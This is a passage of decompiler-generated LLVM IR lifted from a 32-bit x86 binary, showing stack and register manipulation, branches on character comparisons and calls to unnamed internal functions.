  %v1_80499d4 = phi i32 [ %v1_8049f0b, %dec_label_pc_8049ef5 ], [ %v1_8049ef8, %dec_label_pc_80499c3 ], [ %v1_80499d4.pre, %dec_label_pc_8049f19 ]
  %v0_80499d4 = phi i32 [ %v2_8049f06, %dec_label_pc_8049ef5 ], [ %v3_80499c3, %dec_label_pc_80499c3 ], [ %v0_80499d4.pre, %dec_label_pc_8049f19 ]
  %v2_80499d4 = add i32 %v1_80499d4, -4
  %v3_80499d4 = inttoptr i32 %v2_80499d4 to i32*
  store i32 %v0_80499d4, i32* %v3_80499d4, align 4
  %v0_80499d5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80499d5 = add i32 %v1_80499d4, -8
  %v3_80499d5 = inttoptr i32 %v2_80499d5 to i32*
  store i32 %v0_80499d5, i32* %v3_80499d5, align 4
  %v1_80499d6 = add i32 %v1_80499d4, -12
  %v2_80499d6 = inttoptr i32 %v1_80499d6 to i32*
  store i32 10, i32* %v2_80499d6, align 4
  %v0_80499d8 = load i32, i32* @esi, align 4
  %v2_80499d8 = add i32 %v1_80499d4, -16
  %v3_80499d8 = inttoptr i32 %v2_80499d8 to i32*
  store i32 %v0_80499d8, i32* %v3_80499d8, align 4
  %v3_80499d9 = call i32 @function_804f6b0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  %v0_80499de = load i32, i32* @esp, align 4
  %v1_80499de = add i32 %v0_80499de, 16
  store i32 %v3_80499d9, i32* %edx.global-to-local, align 4
  %v1_80499e3 = add i32 %v3_80499d9, -1
  store i32 %v1_80499e3, i32* %eax.global-to-local, align 4
  %v9_80499e6 = icmp eq i32 %v3_80499d9, 9
  store i1 %v9_80499e6, i1* %zf.global-to-local, align 1
  %v6_80499e9 = icmp ugt i32 %v1_80499e3, 8
  br i1 %v6_80499e9, label %dec_label_pc_8049a11, label %dec_label_pc_80499eb

dec_label_pc_80499eb:                             ; preds = %dec_label_pc_80499d4
  %v1_80499eb = add i32 %v0_80499de, 132
  %v2_80499eb = inttoptr i32 %v1_80499eb to i32*
  %v3_80499eb = load i32, i32* %v2_80499eb, align 4
  %v2_80499ef = add i32 %v3_80499eb, %v3_80499d9
  store i32 %v2_80499ef, i32* @ebx, align 4
  %v9_8049a00185 = icmp eq i32 %v1_80499de, 12
  store i1 %v9_8049a00185, i1* %zf.global-to-local, align 1
  %v2_8049a03187 = inttoptr i32 %v0_80499de to i32*
  store i32 0, i32* %v2_8049a03187, align 4
  %v2_8049a05188 = call i32 @function_804fe12(i32* %v1_80484ea)
  store i32 %v2_8049a05188, i32* %eax.global-to-local, align 4
  %v0_8049a0a189 = load i32, i32* @esp, align 4
  %v1_8049a0a190 = add i32 %v0_8049a0a189, 16
  %v1_8049a0d191 = load i32, i32* @ebx, align 4
  %v7_8049a0d192 = icmp ult i32 %v2_8049a05188, %v1_8049a0d191
  %v12_8049a0d193 = icmp eq i32 %v2_8049a05188, %v1_8049a0d191
  store i1 %v12_8049a0d193, i1* %zf.global-to-local, align 1
  br i1 %v7_8049a0d192, label %dec_label_pc_80499f3, label %dec_label_pc_8049a11

dec_label_pc_80499f3:                             ; preds = %dec_label_pc_80499eb, %dec_label_pc_80499f3
  %v0_8049a0a194 = phi i32 [ %v0_8049a0a, %dec_label_pc_80499f3 ], [ %v0_8049a0a189, %dec_label_pc_80499eb ]
  %v9_80499f3 = icmp eq i32 %v0_8049a0a194, -4
  store i1 %v9_80499f3, i1* %zf.global-to-local, align 1
  %v2_80499f6 = inttoptr i32 %v0_8049a0a194 to i32*
  store i32 1, i32* %v2_80499f6, align 4
  %v1_80499f8 = call i32 @function_8051700(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80499f8, i32* %eax.global-to-local, align 4
  %v0_80499fd = load i32, i32* @esp, align 4
  %v9_8049a00 = icmp eq i32 %v0_80499fd, -4
  store i1 %v9_8049a00, i1* %zf.global-to-local, align 1
  %v2_8049a03 = inttoptr i32 %v0_80499fd to i32*
  store i32 0, i32* %v2_8049a03, align 4
  %v2_8049a05 = call i32 @function_804fe12(i32* %v1_80484ea)
  store i32 %v2_8049a05, i32* %eax.global-to-local, align 4
  %v0_8049a0a = load i32, i32* @esp, align 4
  %v1_8049a0a = add i32 %v0_8049a0a, 16
  %v1_8049a0d = load i32, i32* @ebx, align 4
  %v7_8049a0d = icmp ult i32 %v2_8049a05, %v1_8049a0d
  %v12_8049a0d = icmp eq i32 %v2_8049a05, %v1_8049a0d
  store i1 %v12_8049a0d, i1* %zf.global-to-local, align 1
  br i1 %v7_8049a0d, label %dec_label_pc_80499f3, label %dec_label_pc_8049a11

dec_label_pc_8049a11:                             ; preds = %dec_label_pc_80499eb, %dec_label_pc_80499f3, %dec_label_pc_80499d4
  %v0_8049a1a = phi i32 [ %v1_80499de, %dec_label_pc_80499d4 ], [ %v1_8049a0a190, %dec_label_pc_80499eb ], [ %v1_8049a0a, %dec_label_pc_80499f3 ]
  %v1_8049a11 = add i32 %v0_8049a1a, 20900
  %v2_8049a11 = inttoptr i32 %v1_8049a11 to i32*
  %v3_8049a11 = load i32, i32* %v2_8049a11, align 4
  store i32 %v3_8049a11, i32* %eax.global-to-local, align 4
  %v0_8049a18 = load i32, i32* @esi, align 4
  %v2_8049a1d = add i32 %v0_8049a18, %v3_8049a11
  %v12_8049a1d = icmp eq i32 %v2_8049a1d, 0
  store i1 %v12_8049a1d, i1* %zf.global-to-local, align 1
  store i32 %v2_8049a1d, i32* @ebx, align 4
  %v2_8049a1f = add i32 %v0_8049a1a, -16
  %v3_8049a1f = inttoptr i32 %v2_8049a1f to i32*
  store i32 %v2_8049a1d, i32* %v3_8049a1f, align 4
  %v2_8049a20 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8049a20, i32* %eax.global-to-local, align 4
  %v0_8049a25 = load i32, i32* @esp, align 4
  %v9_8049a25 = icmp eq i32 %v0_8049a25, -12
  store i1 %v9_8049a25, i1* %zf.global-to-local, align 1
  %v1_8049a28 = add i32 %v0_8049a25, 8
  %v2_8049a28 = inttoptr i32 %v1_8049a28 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_805248b.15 to i32), i32* %v2_8049a28, align 4
  %v2_8049a2d = add i32 %v0_8049a25, 4
  %v3_8049a2d = inttoptr i32 %v2_8049a2d to i32*
  store i32 %v2_8049a20, i32* %v3_8049a2d, align 4
  %v0_8049a2e = load i32, i32* @ebx, align 4
  %v3_8049a2e = inttoptr i32 %v0_8049a25 to i32*
  store i32 %v0_8049a2e, i32* %v3_8049a2e, align 4
  %v4_8049a2f = call i32 @function_804f8a0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049a2f, i32* %eax.global-to-local, align 4
  %v0_8049a34 = load i32, i32* @esp, align 4
  %v1_8049a34 = add i32 %v0_8049a34, 16
  %v9_8049a37 = icmp eq i32 %v4_8049a2f, 4
  store i1 %v9_8049a37, i1* %zf.global-to-local, align 1
  br i1 %v9_8049a37, label %dec_label_pc_8049e6a, label %dec_label_pc_8049a40

dec_label_pc_8049a40:                             ; preds = %dec_label_pc_8049a11
  %v0_8049a40 = load i32, i32* @ebx, align 4
  %v1_8049a40 = inttoptr i32 %v0_8049a40 to i8*
  %v2_8049a40 = load i8, i8* %v1_8049a40, align 1
  %v11_8049a40 = icmp eq i8 %v2_8049a40, 47
  store i1 %v11_8049a40, i1* %zf.global-to-local, align 1
  br i1 %v11_8049a40, label %dec_label_pc_8049d1e, label %dec_label_pc_8049a49

dec_label_pc_8049a49:                             ; preds = %dec_label_pc_8049d41, %dec_label_pc_8049a40, %dec_label_pc_8049d1e, %dec_label_pc_8049d76
  %v0_8049a49 = phi i32 [ %v1_8049d6b, %dec_label_pc_8049d41 ], [ %v1_8049a34, %dec_label_pc_8049a40 ], [ %v1_8049d33, %dec_label_pc_8049d1e ], [ %v1_8049d8b, %dec_label_pc_8049d76 ]
  %v1_8049a49 = add i32 %v0_8049a49, 76
  %v2_8049a49 = inttoptr i32 %v1_8049a49 to i32*
  %v3_8049a49 = load i32, i32* %v2_8049a49, align 4
  store i32 %v3_8049a49, i32* %edx.global-to-local, align 4
  %v1_8049a4d = add i32 %v3_8049a49, 1431
  %v2_8049a4d = inttoptr i32 %v1_8049a4d to i32*
  store i32 5522759, i32* %v2_8049a4d, align 4
  %v0_8049a57 = load i32, i32* @esp, align 4
  %v1_8049a57 = add i32 %v0_8049a57, 92
  %v2_8049a57 = inttoptr i32 %v1_8049a57 to i32*
  %v3_8049a57 = load i32, i32* %v2_8049a57, align 4
  store i32 %v3_8049a57, i32* %ecx.global-to-local, align 4
  %v1_8049a5b = add i32 %v3_8049a57, -1448
  %v2_8049a5b = inttoptr i32 %v1_8049a5b to i8*
  store i8 10, i8* %v2_8049a5b, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049a67:                             ; preds = %dec_label_pc_8049124
  %v1_8049a67 = add i32 %v0_8049145, 108
  %v2_8049a67 = inttoptr i32 %v1_8049a67 to i32*
  %v3_8049a67 = load i32, i32* %v2_8049a67, align 4
  store i32 %v3_8049a67, i32* %eax.global-to-local, align 4
  %v1_8049a6b = add i32 %v3_8049a67, 12
  %v2_8049a6b = inttoptr i32 %v1_8049a6b to i32*
  store i32 0, i32* %v2_8049a6b, align 4
  br label %dec_label_pc_80491db

dec_label_pc_8049a77:                             ; preds = %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge, %dec_label_pc_804987f, %dec_label_pc_8049854
  %v0_8049a77 = phi i32 [ %v0_8049a77.pre, %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge ], [ %v1_80498d4, %dec_label_pc_804987f ], [ %v1_8049875, %dec_label_pc_8049854 ]
  %v1_8049a77 = add i32 %v0_8049a77, -4
  %v2_8049a77 = inttoptr i32 %v1_8049a77 to i32*
  store i32 4, i32* %v2_8049a77, align 4
  %v1_8049a79 = add i32 %v0_8049a77, -8
  %v2_8049a79 = inttoptr i32 %v1_8049a79 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8052484.13 to i32), i32* %v2_8049a79, align 4
  %v1_8049a7e = add i32 %v0_8049a77, 104
  %v2_8049a7e = inttoptr i32 %v1_8049a7e to i32*
  %v3_8049a7e = load i32, i32* %v2_8049a7e, align 4
  store i32 %v3_8049a7e, i32* %ecx.global-to-local, align 4
  %v2_8049a82 = add i32 %v0_8049a77, -12
  %v3_8049a82 = inttoptr i32 %v2_8049a82 to i32*
  store i32 %v3_8049a7e, i32* %v3_8049a82, align 4
  %v1_8049a83 = add i32 %v0_8049a77, 131
  store i32 %v1_8049a83, i32* %eax.global-to-local, align 4
  %v2_8049a8a = add i32 %v0_8049a77, -16
  %v3_8049a8a = inttoptr i32 %v2_8049a8a to i32*
  store i32 %v1_8049a83, i32* %v3_8049a8a, align 4
  %v0_8049a8b = call i32 @function_804f660()
  store i32 %v0_8049a8b, i32* %eax.global-to-local, align 4
  %v0_8049a90 = load i32, i32* @esp, align 4
  %v1_8049a90 = add i32 %v0_8049a90, 92
  %v2_8049a90 = inttoptr i32 %v1_8049a90 to i32*
  %v3_8049a90 = load i32, i32* %v2_8049a90, align 4
  store i32 %v0_8049a8b, i32* @esi, align 4
  %v1_8049a96 = add i32 %v3_8049a90, 1431
  %v9_8049a96 = icmp eq i32 %v1_8049a96, 0
  store i1 %v9_8049a96, i1* %zf.global-to-local, align 1
  store i32 %v1_8049a96, i32* @ebx, align 4
  %v1_8049a9c = inttoptr i32 %v0_8049a90 to i32*
  %v2_8049a9c = load i32, i32* %v1_8049a9c, align 4
  store i32 %v2_8049a9c, i32* %eax.global-to-local, align 4
  %v3_8049a9c = add i32 %v0_8049a90, 4
  %v1_8049a9d = inttoptr i32 %v3_8049a9c to i32*
  %v2_8049a9d = load i32, i32* %v1_8049a9d, align 4
  store i32 %v2_8049a9d, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8052495.18 to i32), i32* %v1_8049a9d, align 4
  %v0_8049aa3 = load i32, i32* @ebx, align 4
  store i32 %v0_8049aa3, i32* %v1_8049a9c, align 4
  %v0_8049aa4 = call i32 @function_804f920()
  store i32 %v0_8049aa4, i32* %eax.global-to-local, align 4
  %v0_8049aa9 = load i32, i32* @esp, align 4
  %v3_8049aac = trunc i32 %v0_8049aa4 to i8
  %v4_8049aac = icmp eq i8 %v3_8049aac, 0
  store i1 %v4_8049aac, i1* %zf.global-to-local, align 1
  br i1 %v4_8049aac, label %dec_label_pc_8049c4e, label %dec_label_pc_8049ab4

dec_label_pc_8049ab4:                             ; preds = %dec_label_pc_8049a77, %dec_label_pc_8049c4e
  %v0_8049ab4.in = phi i32 [ %v0_8049aa9, %dec_label_pc_8049a77 ], [ %v0_8049c5b, %dec_label_pc_8049c4e ]
  %v1_8049ab4 = add i32 %v0_8049ab4.in, 108
  %v2_8049ab4 = inttoptr i32 %v1_8049ab4 to i32*
  %v3_8049ab4 = load i32, i32* %v2_8049ab4, align 4
  store i32 %v3_8049ab4, i32* %edx.global-to-local, align 4
  %v1_8049ab8 = add i32 %v3_8049ab4, -1448
  %v2_8049ab8 = inttoptr i32 %v1_8049ab8 to i8*
  store i8 7, i8* %v2_8049ab8, align 1
  br label %dec_label_pc_8049abf

dec_label_pc_8049abf:                             ; preds = %dec_label_pc_8049c66, %dec_label_pc_8049ab4
  %v0_8049abf = load i32, i32* @esp, align 4
  %v1_8049abf = add i32 %v0_8049abf, -4
  %v2_8049abf = inttoptr i32 %v1_8049abf to i32*
  store i32 16384, i32* %v2_8049abf, align 4
  %v0_8049ac4 = load i32, i32* @esi, align 4
  %v2_8049ac4 = add i32 %v0_8049abf, -8
  %v3_8049ac4 = inttoptr i32 %v2_8049ac4 to i32*
  store i32 %v0_8049ac4, i32* %v3_8049ac4, align 4
  %v1_8049ac5 = add i32 %v0_8049abf, 131
  store i32 %v1_8049ac5, i32* %eax.global-to-local, align 4
  %v2_8049acc = add i32 %v0_8049abf, -12
  %v3_8049acc = inttoptr i32 %v2_8049acc to i32*
  store i32 %v1_8049ac5, i32* %v3_8049acc, align 4
  %v1_8049acd = add i32 %v0_8049abf, 92
  %v2_8049acd = inttoptr i32 %v1_8049acd to i32*
  %v3_8049acd = load i32, i32* %v2_8049acd, align 4
  store i32 %v3_8049acd, i32* %edx.global-to-local, align 4
  %v1_8049ad1 = add i32 %v3_8049acd, -1452
  %v2_8049ad1 = inttoptr i32 %v1_8049ad1 to i32*
  %v3_8049ad1 = load i32, i32* %v2_8049ad1, align 4
  store i32 %v3_8049ad1, i32* %eax.global-to-local, align 4
  %v2_8049ad7 = add i32 %v0_8049abf, -16
  %v3_8049ad7 = inttoptr i32 %v2_8049ad7 to i32*
  store i32 %v3_8049ad1, i32* %v3_8049ad7, align 4
  %v0_8049ad8 = call i32 @function_805021e()
  store i32 %v0_8049ad8, i32* %eax.global-to-local, align 4
  %v0_8049add = load i32, i32* @esp, align 4
  %v6_8049add = icmp eq i32 %v0_8049add, -16
  store i1 %v6_8049add, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049ae5:                             ; preds = %dec_label_pc_8048ebe
  %v3_8049ae5 = load i32, i32* %v2_8049ae5, align 4
  %v4_8049ae5 = add i32 %v3_8049ae5, -10239
  %v9_8049ae5 = sub i32 10238, %v3_8049ae5
  %v10_8049ae5 = and i32 %v9_8049ae5, %v3_8049ae5
  %v11_8049ae5 = icmp slt i32 %v10_8049ae5, 0
  %v12_8049ae5 = icmp eq i32 %v4_8049ae5, 0
  store i1 %v12_8049ae5, i1* %zf.global-to-local, align 1
  %v13_8049ae5 = icmp slt i32 %v4_8049ae5, 0
  %v3_8049aed = icmp ne i1 %v13_8049ae5, %v11_8049ae5
  %v4_8049aed = or i1 %v12_8049ae5, %v3_8049aed
  br i1 %v4_8049aed, label %dec_label_pc_8048d91, label %dec_label_pc_8048ee1

dec_label_pc_8049af8:                             ; preds = %dec_label_pc_8049577
  %v0_8049af8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049af8 = add i32 %v0_8049af8, -1448
  %v2_8049af8 = inttoptr i32 %v1_8049af8 to i8*
  store i8 1, i8* %v2_8049af8, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049b04:                             ; preds = %dec_label_pc_80497ba
  %v0_8049b04 = load i32, i32* @ebx, align 4
  %v1_8049b04 = inttoptr i32 %v0_8049b04 to i32*
  store i32 104, i32* %v1_8049b04, align 4
  %v0_80497f9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80497f9

dec_label_pc_8049b0f:                             ; preds = %dec_label_pc_8049518
  %v0_8049b0f = load i32, i32* @edi, align 4
  %v1_8049b0f = inttoptr i32 %v0_8049b0f to i32*
  %v2_8049b0f = load i32, i32* %v1_8049b0f, align 4
  %v11_8049b0f = icmp eq i32 %v2_8049b0f, 11
  store i1 %v11_8049b0f, i1* %zf.global-to-local, align 1
  %v1_8049b12 = icmp eq i1 %v11_8049b0f, false
  br i1 %v1_8049b12, label %dec_label_pc_8048e4a, label %dec_label_pc_8048d91

dec_label_pc_8049b1d:                             ; preds = %dec_label_pc_8049468
  %v1_8049b1d = add i32 %v0_804948a, 20916
  %v2_8049b1d = inttoptr i32 %v1_8049b1d to i32*
  store i32 7, i32* %v2_8049b1d, align 4
  %v0_8049b28 = load i32, i32* @esi, align 4
  %v1_8049b28 = add i32 %v0_8049b28, 4
  %v2_8049b28 = inttoptr i32 %v1_8049b28 to i8*
  %v3_8049b28 = load i8, i8* %v2_8049b28, align 1
  %v12_8049b28 = icmp eq i8 %v3_8049b28, 115
  store i1 %v12_8049b28, i1* %zf.global-to-local, align 1
  br i1 %v12_8049b28, label %dec_label_pc_8049d93, label %dec_label_pc_8049b32

dec_label_pc_8049b32:                             ; preds = %dec_label_pc_8049b1d, %dec_label_pc_8049d93
  %v0_8049b32 = load i32, i32* @esp, align 4
  %v1_8049b32 = add i32 %v0_8049b32, 20900
  %v2_8049b32 = inttoptr i32 %v1_8049b32 to i32*
  %v3_8049b32 = load i32, i32* %v2_8049b32, align 4
  store i32 %v3_8049b32, i32* %eax.global-to-local, align 4
  %v0_8049b39 = load i32, i32* @edx, align 4
  %v2_8049b39 = add i32 %v0_8049b32, -4
  %v3_8049b39 = inttoptr i32 %v2_8049b39 to i32*
  store i32 %v0_8049b39, i32* %v3_8049b39, align 4
  %v0_8049b3a = load i32, i32* @ebx, align 4
  %v1_8049b3a = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b3a = sub i32 %v0_8049b3a, %v1_8049b3a
  %v12_8049b3a = icmp eq i32 %v2_8049b3a, 0
  store i1 %v12_8049b3a, i1* %zf.global-to-local, align 1
  store i32 %v2_8049b3a, i32* @ebx, align 4
  %v0_8049b3c = load i32, i32* @esi, align 4
  %v2_8049b3c = add i32 %v0_8049b3c, %v1_8049b3a
  store i32 %v2_8049b3c, i32* %eax.global-to-local, align 4
  %v2_8049b3f = add i32 %v0_8049b32, -8
  %v3_8049b3f = inttoptr i32 %v2_8049b3f to i32*
  store i32 %v2_8049b3a, i32* %v3_8049b3f, align 4
  %v0_8049b40 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b40 = add i32 %v0_8049b32, -12
  %v3_8049b40 = inttoptr i32 %v2_8049b40 to i32*
  store i32 %v0_8049b40, i32* %v3_8049b40, align 4
  %v0_8049b41 = load i32, i32* @esi, align 4
  %v2_8049b41 = add i32 %v0_8049b32, -16
  %v3_8049b41 = inttoptr i32 %v2_8049b41 to i32*
  store i32 %v0_8049b41, i32* %v3_8049b41, align 4
  %v4_8049b42 = call i32 @function_80500b3(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049b42, i32* %eax.global-to-local, align 4
  %v0_8049b47 = load i32, i32* @esp, align 4
  %v1_8049b47 = add i32 %v0_8049b47, 20916
  %v2_8049b47 = inttoptr i32 %v1_8049b47 to i32*
  store i32 0, i32* %v2_8049b47, align 4
  %v0_8049b52 = load i32, i32* @esi, align 4
  %v1_8049b52 = inttoptr i32 %v0_8049b52 to i8*
  %v2_8049b52 = load i8, i8* %v1_8049b52, align 1
  %v3_8049b52 = zext i8 %v2_8049b52 to i32
  %v5_8049b52 = and i32 %v4_8049b42, -256
  %v6_8049b52 = or i32 %v3_8049b52, %v5_8049b52
  store i32 %v6_8049b52, i32* %eax.global-to-local, align 4
  %v0_8049b54 = load i32, i32* @esp, align 4
  %v4_8049b57 = icmp eq i8 %v2_8049b52, 0
  store i1 %v4_8049b57, i1* %zf.global-to-local, align 1
  br i1 %v4_8049b57, label %dec_label_pc_8049b86, label %dec_label_pc_8049b5b

dec_label_pc_8049b5b:                             ; preds = %dec_label_pc_8049b32
  store i32 %v0_8049b52, i32* %ecx.global-to-local, align 4
  %v10_8049b5d = icmp eq i8 %v2_8049b52, 47
  store i1 %v10_8049b5d, i1* %zf.global-to-local, align 1
  br i1 %v10_8049b5d, label %dec_label_pc_8049c80, label %dec_label_pc_8049b65

dec_label_pc_8049b65:                             ; preds = %dec_label_pc_8049b5b
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8049b76171 = add i32 %v0_8049b52, 1
  store i32 %v2_8049b76171, i32* %ecx.global-to-local, align 4
  %v2_8049b79172 = add i32 %v0_8049b54, 20916
  %v3_8049b79173 = inttoptr i32 %v2_8049b79172 to i32*
  store i32 1, i32* %v3_8049b79173, align 4
  %v0_8049b80174 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049b80175 = inttoptr i32 %v0_8049b80174 to i8*
  %v2_8049b80176 = load i8, i8* %v1_8049b80175, align 1
  %v3_8049b80177 = zext i8 %v2_8049b80176 to i32
  %v4_8049b80178 = load i32, i32* @edx, align 4
  %v5_8049b80179 = and i32 %v4_8049b80178, -256
  %v6_8049b80180 = or i32 %v5_8049b80179, %v3_8049b80177
  store i32 %v6_8049b80180, i32* %edx.global-to-local, align 4
  %v4_8049b82181 = icmp eq i8 %v2_8049b80176, 0
  store i1 %v4_8049b82181, i1* %zf.global-to-local, align 1
  %v1_8049b84182 = icmp eq i1 %v4_8049b82181, false
  br i1 %v1_8049b84182, label %dec_label_pc_8049b6c, label %dec_label_pc_8049b86

dec_label_pc_8049b6c:                             ; preds = %dec_label_pc_8049b65, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge
  %v2_8049b80184 = phi i8 [ %v2_8049b80, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge ], [ %v2_8049b80176, %dec_label_pc_8049b65 ]
  %v0_8049b80183 = phi i32 [ %v0_8049b80, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge ], [ %v0_8049b80174, %dec_label_pc_8049b65 ]
  %v0_8049b6c = load i32, i32* %eax.global-to-local, align 4
  %v1_8049b6c = add i32 %v0_8049b6c, 1
  store i32 %v1_8049b6c, i32* %eax.global-to-local, align 4
  %v10_8049b6d = icmp eq i8 %v2_8049b80184, 47
  store i1 %v10_8049b6d, i1* %zf.global-to-local, align 1
  br i1 %v10_8049b6d, label %dec_label_pc_8049c80, label %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge

dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge: ; preds = %dec_label_pc_8049b6c
  %v1_8049b76.pre = load i32, i32* @esi, align 4
  %v1_8049b79.pre = load i32, i32* @esp, align 4
  %v2_8049b76 = add i32 %v1_8049b6c, %v1_8049b76.pre
  store i32 %v2_8049b76, i32* %ecx.global-to-local, align 4
  %v2_8049b79 = add i32 %v1_8049b79.pre, 20900
  %v3_8049b79 = inttoptr i32 %v2_8049b79 to i32*
  store i32 %v1_8049b6c, i32* %v3_8049b79, align 4
  %v0_8049b80 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049b80 = inttoptr i32 %v0_8049b80 to i8*
  %v2_8049b80 = load i8, i8* %v1_8049b80, align 1
  %v3_8049b80 = zext i8 %v2_8049b80 to i32
  %v4_8049b80 = load i32, i32* %edx.global-to-local, align 4
  %v5_8049b80 = and i32 %v4_8049b80, -256
  %v6_8049b80 = or i32 %v5_8049b80, %v3_8049b80
  store i32 %v6_8049b80, i32* %edx.global-to-local, align 4
  %v4_8049b82 = icmp eq i8 %v2_8049b80, 0
  store i1 %v4_8049b82, i1* %zf.global-to-local, align 1
  %v1_8049b84 = icmp eq i1 %v4_8049b82, false
  br i1 %v1_8049b84, label %dec_label_pc_8049b6c, label %dec_label_pc_8049b86

dec_label_pc_8049b86:                             ; preds = %dec_label_pc_8049b65, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge, %dec_label_pc_8049b32, %dec_label_pc_8049c80
  %v0_8049b86 = load i32, i32* @esp, align 4
  %v9_8049b86 = icmp eq i32 %v0_8049b86, 12
  store i1 %v9_8049b86, i1* %zf.global-to-local, align 1
  %v0_8049b89 = load i32, i32* @esi, align 4
  %v2_8049b89 = add i32 %v0_8049b86, -16
  %v3_8049b89 = inttoptr i32 %v2_8049b89 to i32*
  store i32 %v0_8049b89, i32* %v3_8049b89, align 4
  %v2_8049b8a = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8049b8a, i32* %eax.global-to-local, align 4
  %v0_8049b8f = load i32, i32* @esp, align 4
  %v1_8049b8f = add i32 %v0_8049b8f, 16
  %v1_8049b92 = icmp eq i32 %v2_8049b8a, 0
  store i1 %v1_8049b92, i1* %zf.global-to-local, align 1
  %tmp147 = icmp slt i32 %v2_8049b8a, 1
  br i1 %tmp147, label %dec_label_pc_8049bbc, label %dec_label_pc_8049b96

dec_label_pc_8049b96:                             ; preds = %dec_label_pc_8049b86
  %v9_8049b96 = icmp eq i32 %v0_8049b8f, -4
  store i1 %v9_8049b96, i1* %zf.global-to-local, align 1
  %v0_8049b99 = load i32, i32* @esi, align 4
  %v3_8049b99 = inttoptr i32 %v0_8049b8f to i32*
  store i32 %v0_8049b99, i32* %v3_8049b99, align 4
  %v2_8049b9a = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8049b9a, i32* %eax.global-to-local, align 4
  %v0_8049b9f = load i32, i32* @esp, align 4
  %v1_8049b9f = add i32 %v0_8049b9f, 16
  %v1_8049ba2 = add i32 %v2_8049b9a, -127
  %v6_8049ba2 = sub i32 126, %v2_8049b9a
  %v7_8049ba2 = and i32 %v6_8049ba2, %v2_8049b9a
  %v8_8049ba2 = icmp slt i32 %v7_8049ba2, 0
  %v9_8049ba2 = icmp eq i32 %v1_8049ba2, 0
  store i1 %v9_8049ba2, i1* %zf.global-to-local, align 1
  %v10_8049ba2 = icmp slt i32 %v1_8049ba2, 0
  %v3_8049ba5 = icmp eq i1 %v10_8049ba2, %v8_8049ba2
  %v4_8049ba5 = icmp eq i1 %v9_8049ba2, false
  %v5_8049ba5 = and i1 %v4_8049ba5, %v3_8049ba5
  br i1 %v5_8049ba5, label %dec_label_pc_8049bbc, label %dec_label_pc_8049ba7

dec_label_pc_8049ba7:                             ; preds = %dec_label_pc_8049b96
  %v2_8049ba7 = add i32 %v0_8049b9f, 12
  %v3_8049ba7 = inttoptr i32 %v2_8049ba7 to i32*
  store i32 %v2_8049b9a, i32* %v3_8049ba7, align 4
  %v2_8049ba8 = add i32 %v0_8049b9f, 8
  %v3_8049ba8 = inttoptr i32 %v2_8049ba8 to i32*
  store i32 %v2_8049b9a, i32* %v3_8049ba8, align 4
  %v0_8049ba9 = load i32, i32* @esi, align 4
  %v2_8049ba9 = add i32 %v0_8049b9f, 4
  %v3_8049ba9 = inttoptr i32 %v2_8049ba9 to i32*
  store i32 %v0_8049ba9, i32* %v3_8049ba9, align 4
  %v1_8049baa = add i32 %v0_8049b9f, 92
  %v2_8049baa = inttoptr i32 %v1_8049baa to i32*
  %v3_8049baa = load i32, i32* %v2_8049baa, align 4
  %v1_8049bae = add i32 %v3_8049baa, 789
  %v9_8049bae = icmp eq i32 %v1_8049bae, 0
  store i1 %v9_8049bae, i1* %zf.global-to-local, align 1
  store i32 %v1_8049bae, i32* %eax.global-to-local, align 4
  %v3_8049bb3 = inttoptr i32 %v0_8049b9f to i32*
  store i32 %v1_8049bae, i32* %v3_8049bb3, align 4
  %v3_8049bb4 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049bb4, i32* %eax.global-to-local, align 4
  %v0_8049bb9 = load i32, i32* @esp, align 4
  %v1_8049bb9 = add i32 %v0_8049bb9, 16
  %v6_8049bb9 = icmp eq i32 %v1_8049bb9, 0
  store i1 %v6_8049bb9, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049bbc

dec_label_pc_8049bbc:                             ; preds = %dec_label_pc_8049b96, %dec_label_pc_8049b86, %dec_label_pc_8049ba7
  %v0_8049bbc = phi i32 [ %v1_8049b9f, %dec_label_pc_8049b96 ], [ %v1_8049b8f, %dec_label_pc_8049b86 ], [ %v1_8049bb9, %dec_label_pc_8049ba7 ]
  %v0_8049bbf = load i32, i32* @esi, align 4
  store i32 %v0_8049bbf, i32* %eax.global-to-local, align 4
  %v1_8049bc1 = add i32 %v0_8049bbc, 20900
  %v2_8049bc1 = inttoptr i32 %v1_8049bc1 to i32*
  %v3_8049bc1 = load i32, i32* %v2_8049bc1, align 4
  %v2_8049bc8 = add i32 %v0_8049bbf, 1
  %v1_8049bca = add i32 %v2_8049bc8, %v3_8049bc1
  %v8_8049bca = icmp eq i32 %v1_8049bca, 0
  store i1 %v8_8049bca, i1* %zf.global-to-local, align 1
  store i32 %v1_8049bca, i32* %eax.global-to-local, align 4
  %v2_8049bcb = add i32 %v0_8049bbc, -16
  %v3_8049bcb = inttoptr i32 %v2_8049bcb to i32*
